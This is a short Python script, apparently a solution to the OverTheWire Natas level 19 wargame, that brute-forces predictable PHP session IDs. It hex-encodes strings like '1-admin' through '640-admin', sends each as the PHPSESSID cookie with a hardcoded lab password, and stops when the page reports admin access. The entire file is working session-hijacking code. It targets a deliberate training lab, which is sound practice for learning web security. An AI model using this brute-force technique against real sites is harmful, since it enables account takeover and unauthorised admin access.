import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")  # replace with your natas19 password

for i in range(1, 641):
    session_string = f"{i}-admin"
    session_hex = session_string.encode().hex()

    cookies = {"PHPSESSID": session_hex}

    response = requests.get(url, auth=auth, cookies=cookies)
    print("session_string:", session_string)
    print("session_hex:", session_hex)
    print("Response status code:", response.status_code)
    if "You are an admin" in response.text:
        print(f"[+] Found session: {session_hex}")
        print(response.text)
        print("session_string:", session_string)
        break
    